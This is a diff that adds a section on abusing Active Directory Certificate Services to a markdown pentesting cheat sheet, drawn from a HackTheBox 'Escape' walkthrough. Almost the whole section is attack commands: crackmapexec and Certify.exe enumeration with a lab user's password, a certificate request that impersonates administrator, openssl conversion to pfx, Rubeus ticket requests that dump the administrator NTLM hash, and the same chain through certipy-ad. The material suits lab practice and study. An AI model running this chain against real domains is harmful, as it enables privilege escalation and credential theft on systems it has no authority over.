@@ -137,3 +137,50 @@ hostname
 
 
 ```
+
+
+### Active Directory Certificate Services (ADCS) [Example](https://0xdf.gitlab.io/2023/06/17/htb-escape.html)
+
+```
+#### Identify ADCS
+
+crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
+
+#### Identify Vulnerable Template
+
+upload Certify.exe
+
+.\Certify.exe find /vulnerable /currentuser
+
+
+### Abuse Template
+
+.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
+
+Both the README and the end of that output show the next step. I’ll copy everything from `-----BEGIN RSA PRIVATE KEY-----` to `-----END CERTIFICATE-----` into a file on my host and convert it to a `.pfx` using the command given, entering no password when prompted:
+
+
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx
+
+.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
+
+The last line is the NTLM hash for the administrator account.
+
+or #### With Certipy
+
+certipy-ad find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
+
+certipy-ad req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
+
+certipy-ad auth -pfx administrator.pfx
+
+ntpdate -u sequel.htb
+
+certipy-ad auth -pfx administrator.pfx
+
+
+
+
+```
